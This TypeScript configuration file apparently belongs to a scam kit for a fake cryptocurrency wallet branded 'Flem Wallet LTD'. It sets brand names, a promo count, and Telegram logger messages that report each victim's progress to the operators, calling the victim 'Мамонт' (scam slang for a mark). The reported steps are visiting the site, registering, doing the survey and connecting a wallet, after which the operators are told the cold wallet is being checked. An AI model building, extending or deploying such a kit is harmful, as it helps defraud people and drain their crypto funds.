// * Initial data for set project name, limits, etc.
// * def - default project name

export const projectNames = {
    def: "Flem",
    defCaps: "FLEM",
    defWallet: "Flem Wallet",
    defCapsWallet: "FLEM Wallet",
    defWalletLtd: "Flem Wallet LTD",
};
export const curPromoCount: number = 60;

// * Data for TG logger
export const logMessages = {
    visited: `Мамонт <b>перешел на сайт</b>`,
    startRegister: `Мамонт <b>регистрируется</b>`,
    registered: `Мамонт <b>зарегистрировался</b>`,
    survey: `Мамонт <b>прошёл опрос</b>`,
    walletConnect: `<b><u>Кошелёк добавлен.</u></b> Проверяю холодок...`,
};

export const TG_METHOD_NAMES = {
    updates: "getUpdates",
    sendMessage: "sendMessage",
};
